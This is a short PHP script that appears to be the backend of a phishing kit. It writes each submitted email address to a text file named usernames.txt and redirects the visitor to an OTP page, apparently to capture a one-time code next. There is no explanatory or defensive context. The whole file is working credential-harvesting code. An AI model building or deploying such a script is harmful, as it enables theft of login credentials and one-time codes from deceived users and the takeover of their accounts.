<?php

file_put_contents("usernames.txt", "" . $username = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
